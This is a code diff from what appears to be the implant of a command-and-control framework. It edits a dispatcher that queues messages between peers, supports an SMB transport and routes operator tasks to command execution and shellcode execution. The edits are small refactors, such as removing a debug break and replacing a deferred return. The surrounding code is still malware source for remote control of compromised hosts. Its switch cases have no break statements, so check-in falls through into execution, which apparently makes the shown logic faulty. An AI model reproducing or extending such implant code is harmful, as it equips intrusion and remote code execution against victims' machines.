@@ -156,7 +156,6 @@ namespace Dispatcher {
     VOID PrepareIngressMessage(_stream *in) {
         HEXANE
 
-        __debugbreak();
         if (in) {
             if (PeekPeerId(in) != Ctx->session.peer_id) {
                 OutboundQueue(in);
@@ -182,7 +181,8 @@ namespace Dispatcher {
         if (!Ctx->transport.outbound_queue) {
 
 #ifdef TRANSPORT_SMB
-            return_defer(ERROR_SUCCESS);
+            nstatus = ERROR_SUCCESS;
+            return;
 #else
             const auto entry = Stream::CreateStreamWithHeaders(TypeTasking);
             Dispatcher::OutboundQueue(entry);
@@ -203,7 +203,6 @@ namespace Dispatcher {
         Dispatcher::PrepareIngressMessage(in);
 
         Clients::PushClients();
-        defer:
     }
 
     VOID CommandDispatch (const _stream *const in) {
@@ -215,8 +214,8 @@ namespace Dispatcher {
         Parser::UnpackDword(&parser);
 
         Ctx->session.current_taskid = Parser::UnpackDword(&parser);
-        switch (Parser::UnpackDword(&parser)) {
 
+        switch (Parser::UnpackDword(&parser)) {
             case TypeCheckin:   Ctx->session.checkin = true;
             case TypeTasking:   Memory::Execute::ExecuteCommand(parser);
             case TypeExecute:   Memory::Execute::ExecuteShellcode(parser);
